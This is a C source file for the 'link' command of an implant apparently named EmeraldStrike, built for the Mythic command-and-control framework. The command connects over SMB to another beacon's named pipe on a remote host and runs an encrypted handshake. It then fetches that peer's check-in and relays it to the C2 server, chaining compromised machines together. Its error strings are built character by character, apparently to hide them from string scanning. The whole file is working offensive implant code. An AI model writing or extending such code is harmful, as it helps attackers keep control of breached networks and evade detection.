#include "config.h"
#ifdef INCLUDE_CMD_LINK

#include "commands.h"
#include "crypto.h"


#include "transport_smb.h"

// link <host> <pipename>
// Connect as a CLIENT to a remote EmeraldStrike SMB beacon's named pipe,
// run the encrypted link handshake and register the peer locally.
VOID cmd_link(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD host_len = 0;
    DWORD pipe_len = 0;
    char* host = parser_string(args, &host_len);
    char* pipe = parser_string(args, &pipe_len);

    if (!host || host_len == 0 || !pipe || pipe_len == 0) {
        package_add_string(inst, response, XSTR("usage: link <host> <pipename>"));
        response->is_error = TRUE;
        return;
    }

    char hostbuf[256] = {0};
    char pipebuf[256] = {0};
    es_memcpy(hostbuf, (PVOID)host, host_len < sizeof(hostbuf) - 1 ? host_len : sizeof(hostbuf) - 1);
    es_memcpy(pipebuf, (PVOID)pipe, pipe_len < sizeof(pipebuf) - 1 ? pipe_len : sizeof(pipebuf) - 1);

    // Reuse an existing (inactive) slot for the same host+pipe, else take a new one.
    int slot = -1;
    for (int i = 0; i < ES_MAX_LINKED_PEERS; i++) {
        if (inst->LinkedPeers[i].active &&
            es_strcmp(inst->LinkedPeers[i].host, hostbuf) == 0 &&
            es_strcmp(inst->LinkedPeers[i].pipename, pipebuf) == 0) {
            package_add_string(inst, response, XSTR("Already linked to that peer"));
            return;
        }
        if (!inst->LinkedPeers[i].active && slot < 0)
            slot = i;
    }
    if (slot < 0) {
        package_add_string(inst, response, XSTR("Linked peer table full"));
        response->is_error = TRUE;
        return;
    }

    HANDLE h = INVALID_HANDLE_VALUE;
    if (!smb_link_connect(inst, hostbuf, pipebuf, &h)) {
        DWORD link_err = inst->Win32.GetLastError();
        static const char m1[] = {'F','a','i','l','e','d',' ','t','o',' ','c','o','n','n','e','c','t',' ','t','o',' ','r','e','m','o','t','e',' ','p','i','p','e',' ','(','e','r','r',' ',0};
        char msg[96] = {0};
        es_strcpy(msg, m1);
        // append decimal error code
        char digits[12] = {0};
        int di = 0;
        if (!link_err) digits[di++] = '0';
        while (link_err && di < 11) { digits[di++] = '0' + (link_err % 10); link_err /= 10; }
        int ml = 0; while (msg[ml]) ml++;
        while (di > 0 && ml < 94) msg[ml++] = digits[--di];
        // append handshake stage (0=connect-only failure)
        msg[ml++] = ' '; msg[ml++] = 'h'; msg[ml++] = 's'; msg[ml++] = '=';
        DWORD st = smb_last_hs_stage();
        if (!st) { msg[ml++] = '0'; }
        char dd[12] = {0}; int dj = 0;
        while (st && dj < 11) { dd[dj++] = '0' + (st % 10); st /= 10; }
        while (dj > 0 && ml < 94) msg[ml++] = dd[--dj];
        msg[ml] = 0;
        package_add_string(inst, response, msg);
        response->is_error = TRUE;
        return;
    }

    char peer_uuid[37] = {0};
    if (!smb_link_handshake(inst, h, peer_uuid, sizeof(peer_uuid))) {
        inst->Win32.CloseHandle(h);
        // stage: 1=send fail 2=no reply 3=decrypt fail 4=bad reply TLVs
        static const char m2[] = {'L','i','n','k',' ','h','a','n','d','s','h','a','k','e',' ','f','a','i','l','e','d',' ','s','t','a','g','e',' ',0};
        char msg[64] = {0};
        es_strcpy(msg, m2);
        DWORD st = smb_last_hs_stage();
        char dd[12] = {0}; int dj = 0;
        if (!st) msg[dj++] = '0';
        while (st && dj < 11) { dd[dj++] = '0' + (st % 10); st /= 10; }
        int ml = 0; while (msg[ml]) ml++;
        while (dj > 0 && ml < 60) msg[ml++] = dd[--dj];
        msg[ml] = 0;
        package_add_string(inst, response, msg);
        response->is_error = TRUE;
        return;
    }

    es_strcpy(inst->LinkedPeers[slot].host, hostbuf);
    es_strcpy(inst->LinkedPeers[slot].pipename, pipebuf);
    es_strcpy(inst->LinkedPeers[slot].uuid, peer_uuid);
    inst->LinkedPeers[slot].pipe = h;
    inst->LinkedPeers[slot].active = TRUE;
    inst->LinkedPeers[slot].checkin_sent = FALSE;
    inst->LinkedPeers[slot].delegate_checkin_b64 = NULL;
    inst->LinkedPeers[slot].delegate_checkin_b64_len = 0;
    inst->LinkedPeerCount++;

    // Request the peer's encrypted checkin blob so we can relay it as a delegate.
    // Send a "checkin" command frame; the peer's SMB server builds its checkin,
    // encrypts it with its payload key, UUID-prepends, and base64-encodes it.
    // Post-handshake, all frames are encrypted under the link session key
    // (which is our payload AES key, sent during the handshake).
    {
        // Build a minimal TLV frame: COMMAND("checkin") + TASKID("0")
        BYTE ci_frame[20] = {0};
        DWORD fp = 0;
        ci_frame[fp++] = 0x03; // TLV_COMMAND
        ci_frame[fp++] = 0; ci_frame[fp++] = 0; ci_frame[fp++] = 0; ci_frame[fp++] = 7;
        ci_frame[fp++] = 'c'; ci_frame[fp++] = 'h'; ci_frame[fp++] = 'e';
        ci_frame[fp++] = 'c'; ci_frame[fp++] = 'k'; ci_frame[fp++] = 'i'; ci_frame[fp++] = 'n';
        ci_frame[fp++] = 0x02; // TLV_TASKID
        ci_frame[fp++] = 0; ci_frame[fp++] = 0; ci_frame[fp++] = 0; ci_frame[fp++] = 1;
        ci_frame[fp++] = '0';

        // Encrypt with our AES key (same key the server stores as the link session key)
        BYTE* enc_frame = NULL; DWORD enc_frame_len = 0;
        extern BOOL mythic_encrypt(PINSTANCE, const BYTE*, DWORD, BYTE**, DWORD*);
        if (mythic_encrypt(inst, ci_frame, fp, &enc_frame, &enc_frame_len) && enc_frame) {
            smb_send_frame(inst, h, enc_frame, enc_frame_len);
            es_free(inst, enc_frame);
        } else {
            // Fallback: send plaintext (will fail on encrypted server, but at least try)
            smb_send_frame(inst, h, ci_frame, fp);
        }

        BYTE* ci_resp = NULL; DWORD ci_resp_len = 0;
        smb_recv_frame(inst, h, &ci_resp, &ci_resp_len);
        if (ci_resp && ci_resp_len > 0) {
            inst->LinkedPeers[slot].delegate_checkin_b64 = ci_resp;
            inst->LinkedPeers[slot].delegate_checkin_b64_len = ci_resp_len;

            // ── Queue ACTION_LINK_ADD message for Mythic ──
            // Format: ACTION_LINK_ADD(0x05) + c2_type(1 byte, 0x00=smb)
            //       + link_id(int32, slot index) + peer_uuid(len-prefixed string)
            //       + checkin_blob(len-prefixed bytes)
            DWORD peer_uuid_len = es_strlen(peer_uuid);
            DWORD add_msg_len = 1 + 1 + 4 + 4 + peer_uuid_len + 4 + ci_resp_len;
            BYTE* add_msg = (BYTE*)es_malloc(inst, add_msg_len);
            if (add_msg) {
                DWORD ap = 0;
                add_msg[ap++] = 0x05;  // ACTION_LINK_ADD
                add_msg[ap++] = 0x00;  // C2_PROFILE_SMB
                // link_id = slot index (big-endian int32)
                add_msg[ap++] = (BYTE)((slot >> 24) & 0xFF);
                add_msg[ap++] = (BYTE)((slot >> 16) & 0xFF);
                add_msg[ap++] = (BYTE)((slot >> 8)  & 0xFF);
                add_msg[ap++] = (BYTE)( slot        & 0xFF);
                // peer_uuid (length-prefixed string)
                add_msg[ap++] = (BYTE)((peer_uuid_len >> 24) & 0xFF);
                add_msg[ap++] = (BYTE)((peer_uuid_len >> 16) & 0xFF);
                add_msg[ap++] = (BYTE)((peer_uuid_len >> 8)  & 0xFF);
                add_msg[ap++] = (BYTE)( peer_uuid_len        & 0xFF);
                es_memcpy(add_msg + ap, (PVOID)peer_uuid, peer_uuid_len);
                ap += peer_uuid_len;
                // checkin_blob (length-prefixed bytes)
                add_msg[ap++] = (BYTE)((ci_resp_len >> 24) & 0xFF);
                add_msg[ap++] = (BYTE)((ci_resp_len >> 16) & 0xFF);
                add_msg[ap++] = (BYTE)((ci_resp_len >> 8)  & 0xFF);
                add_msg[ap++] = (BYTE)( ci_resp_len        & 0xFF);
                es_memcpy(add_msg + ap, ci_resp, ci_resp_len);
                ap += ci_resp_len;

                                // Send ACTION_LINK_ADD directly via send_mythic_msg
                extern BOOL send_mythic_msg(PINSTANCE, BYTE*, DWORD, BYTE**, DWORD*);
                BOOL sent = send_mythic_msg(inst, add_msg, ap, NULL, NULL);
                es_free(inst, add_msg);
                if (sent) inst->LinkedPeers[slot].checkin_sent = TRUE;
            }
        }
    }

    // Status output (always emit something).
    char msg[640] = {0};
    char* p = msg;
    const char* pre = "Linked: \\\\";
    for (int i = 0; pre[i]; i++) *p++ = pre[i];
    for (int i = 0; hostbuf[i]; i++) *p++ = hostbuf[i];
    const char* mid = "\\pipe\\";
    for (int i = 0; mid[i]; i++) *p++ = mid[i];
    for (int i = 0; pipebuf[i]; i++) *p++ = pipebuf[i];
    const char* tail = " (peer ";
    for (int i = 0; tail[i]; i++) *p++ = tail[i];
    for (int i = 0; peer_uuid[i]; i++) *p++ = peer_uuid[i];
    *p++ = ')';
    // Append delegate checkin status
    if (inst->LinkedPeers[slot].delegate_checkin_b64) {
        const char* cs = " ci=";
        for (int i = 0; cs[i]; i++) *p++ = cs[i];
        DWORD cl = inst->LinkedPeers[slot].delegate_checkin_b64_len;
        char digits[12] = {0}; int di = 0;
        if (!cl) digits[di++] = '0';
        while (cl && di < 11) { digits[di++] = '0' + (cl % 10); cl /= 10; }
        while (di > 0) *p++ = digits[--di];
    } else {
        const char* cs = " ci=NONE";
        for (int i = 0; cs[i]; i++) *p++ = cs[i];
    }
    *p = 0;
    package_add_string(inst, response, msg);
}

#endif // INCLUDE_CMD_LINK
